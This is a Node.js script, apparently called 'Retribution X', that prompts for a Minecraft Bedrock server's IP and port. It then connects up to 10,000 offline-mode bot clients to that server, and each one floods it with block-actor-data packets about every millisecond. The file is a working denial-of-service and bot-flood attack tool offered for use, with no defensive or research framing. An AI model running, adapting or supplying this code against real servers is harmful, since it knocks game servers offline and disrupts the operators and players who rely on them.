// 🚫 This script is copyrighted. If this script is published without information about the main developers, a deletion request will be submitted.
// ✅ If you want to change the script for the rework, be sure to specify the main developers.

const bedrock = require('bedrock-protocol');
const { randomBytes } = require('crypto');
const readline = require('readline');

console.error('\x1b[31m%s\x1b[0m',`
██████╗░███████╗████████╗██████╗░██╗██████╗░██╗░░░██╗████████╗██╗░█████╗░███╗░░██╗  ██╗░░██╗
██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██║██╔══██╗██║░░░██║╚══██╔══╝██║██╔══██╗████╗░██║  ╚██╗██╔╝
██████╔╝█████╗░░░░░██║░░░██████╔╝██║██████╦╝██║░░░██║░░░██║░░░██║██║░░██║██╔██╗██║  ░╚███╔╝░
██╔══██╗██╔══╝░░░░░██║░░░██╔══██╗██║██╔══██╗██║░░░██║░░░██║░░░██║██║░░██║██║╚████║  ░██╔██╗░
██║░░██║███████╗░░░██║░░░██║░░██║██║██████╦╝╚██████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║  ██╔╝╚██╗
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═════╝░░╚═════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝  ╚═╝░░╚═╝
`);
console.log("");
console.log("");
console.log("============");
console.warn("╭ Retribution X");
console.warn("╰ Version :: 1.2");
console.log("============");
console.warn("╭ Discord :: https://discord.gg/VXR9T329px");
console.warn("╰ Developers :: Retribution X Team");
console.log("============");
console.log("");
console.log("");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const askForServerDetails = () => {
  return new Promise((resolve) => {
    rl.question('Enter the server address (IP): ', (host) => {
      rl.question('Enter the server port (Port): ', (port) => {
        rl.question('Enter the number of clients (1-10000): ', (numClientsInput) => {
          const numClients = parseInt(numClientsInput);
          if (numClients < 1 || numClients > 10000) {
            console.error("The number must be at least 0 and no more than 10000.")
            console.error("Start start.bat again!")
            process.exit();
            return askForServerDetails().then(resolve); 
          } else {
            resolve({ host, port: parseInt(port), numClients });
          }
        });
      });
    });
  });
};

const askForBotName = () => {
  return new Promise((resolve) => {
    rl.question('Enter the name of clients (3-12 characters): ', (botName) => {
      if (botName.length < 3 || botName.length > 12) {
        console.error("The name must be between 3 and 12 characters.");
        askForBotName().then(resolve);
      } else {
        resolve(botName);
        rl.close(); 
      }
    });
  });
};

askForServerDetails().then((server) => {
  askForBotName().then((botName) => {
    const { host, port, numClients } = server; 
    const servers = [{ host, port }]; 

    let serverIndex = 0;

    const generateUniqueUUID = () => randomBytes(16).toString('hex');

    const createClient = async (username, server) => {
      const client = bedrock.createClient({
        host: server.host,
        port: server.port,
        username: username,
        offline: true,
        version: '1.21.2',
      });

      client.on('connect', () => {
        console.log(`Bot ${username} has connected to ${server.host}.`);
        startSendingPackets(client);
      });

      client.on('error', (error) => {
        console.error(`Connection error for ${username}:`, error.message);
      });

      client.on('disconnect', () => {
        console.warn(`Bot ${username} has disconnected.`);
      });

      return client;
    };

    const sendBlockActorDataPacket = (client) => {
      const packetData = {
        NBTData: new Array(100).fill(0).map(() => 0),
      };
      
      client.write('blockactordatapacket', packetData);
    };

    const startSendingPackets = (client) => {
      setInterval(() => {
        sendBlockActorDataPacket(client);
      }, 100 / 100); 
    };

    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    const createClients = async (numClients) => {
      for (let i = 0; i < numClients; i++) {
        const username = `${botName}_${i + 1}`;
        const server = servers[serverIndex];
        const client = await createClient(username, server);

        serverIndex = (serverIndex + 1) % servers.length;

        if ((i + 1) % 3 === 0) {
          console.log(`${i + 1} clients have been created. The next batch of clients connect in 1000 ms`);
          await delay(1000); 
        } else {
          await delay(200); 
        }
      }
    };

    createClients(numClients).then(() => {
      console.error(`${numClients} clients launched`);
      console.error(`Start start.bat again!`)
    }).catch(err => {
      console.error('Error when launching clients:', err);
      console.error("Start start.bat again!")
    });

  }).catch(err => {
    console.error('Error getting bot name:', err);
    console.error("Start start.bat again!")
  });

}).catch(err => {
  console.error('Error getting server details:', err);
  console.error("Start botfactory.bat again!")
});